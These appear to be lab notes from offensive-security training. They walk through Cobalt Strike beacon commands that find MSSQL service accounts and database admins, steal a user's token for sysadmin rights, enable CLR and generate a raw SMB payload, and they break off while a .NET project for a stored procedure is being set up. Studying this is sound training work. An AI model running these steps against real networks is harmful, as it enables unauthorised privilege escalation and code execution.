search for MSSQL servers with kerberos auth
    beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName

we see lon-db-1 has a mssql_svc
let's query info about the instance and our privs on it
    beacon> sql-info lon-db-1    
    beacon> sql-whoami lon-db-1

this shows us that we have no privs, authenticating a pchilds
let's search for principals with sysadmin privs
    beacon> ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member

this shows us that rsteel is a database admin!
let's impersonate rsteel and re enumerate
    steal token from rsteel
    beacon> sql-whoami lon-db-1

now we have all admin privs!
let's check the status of CLR
    beacon> sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"

returns 0 (disabled), so let's enable it
    beacon> sql-enableclr lon-db-1

now let's generate an x64 smb payload
    payload > windows stagless payload
    listener: smb
    output: raw
    exit function: thread
    save to C:\Payloads\smb_x64.xthread.bin

now in vscode create a new class library (.NET Framework) project names MyProcedure

